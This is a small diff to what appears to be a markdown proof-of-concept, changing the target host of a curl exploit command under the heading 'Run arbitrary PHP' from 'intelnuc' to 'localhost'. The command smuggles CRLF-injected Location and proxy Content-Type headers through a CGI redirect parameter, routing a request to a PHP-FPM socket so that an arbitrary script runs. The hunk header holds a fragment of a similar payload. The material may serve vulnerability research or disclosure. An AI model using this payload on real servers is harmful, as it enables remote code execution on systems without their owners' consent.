@@ -32,6 +32,6 @@ curl 'http://localhost:8090/cgi-bin/redir.cgi?r=http://%0d%0aLocation:/ooo%0d%0a
 ## Run arbitrary PHP
 
 ```
-curl 'http://intelnuc:8090/cgi-bin/redir.cgi?r=http://%0d%0aLocation:/ooo?%0d%0aContent-Type:proxy:unix:/run/php/php8.2-fpm.sock|fcgi://127.0.0.1/usr/share/anyscript.php%3f%0d%0a%0d%0a'
+curl 'http://localhost:8090/cgi-bin/redir.cgi?r=http://%0d%0aLocation:/ooo?%0d%0aContent-Type:proxy:unix:/run/php/php8.2-fpm.sock|fcgi://127.0.0.1/usr/share/anyscript.php%3f%0d%0a%0d%0a'
 
 ```
